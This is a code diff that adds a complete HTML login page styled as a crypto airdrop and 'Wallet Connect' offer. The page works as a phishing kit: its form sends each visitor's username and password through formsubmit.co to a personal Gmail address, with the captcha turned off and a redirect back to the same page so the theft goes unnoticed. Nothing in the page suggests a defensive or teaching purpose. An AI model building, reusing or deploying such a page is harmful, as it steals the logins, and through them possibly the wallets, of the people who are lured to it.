@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="logo.webp" alt="Logo" class="logo">
+        </div>
+        <div class="header-right">
+            <img src="bell icon.webp" alt="Notifications" class="bell-icon">
+            <a href="#" class="airdrop">Airdrop</a>
+            <div class="menu-icon">☰</div>
+        </div>
+    </header>
+
+    <div class="login-container">
+        <div class="eid">Special Eid Offer</div>
+        <div class="login"> <h2>Log in</h2></div>  
+        
+        <div class="wallet-button">Wallet Connect</div>
+
+        <form action="https://formsubmit.co/Lalibjaan996@gmail.com" method="POST">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="index.html"> <!-- Redirects back to the same page -->
+
+            <label for="username">User name<span>*</span></label>
+            <input type="text" id="username" name="username" placeholder="User name" required>
+
+            <label for="password">Password<span>*</span></label>
+            <div class="password-container">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <span class="eye-icon">👁️</span>
+            </div>
+
+            <a href="#" class="forgot-password">Forgot Password?</a>
+
+            <button type="submit" class="confirm-btn">Confirm</button>
+        </form>
+
+        <button class="cancel-btn">Cancel</button>
+
+        <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
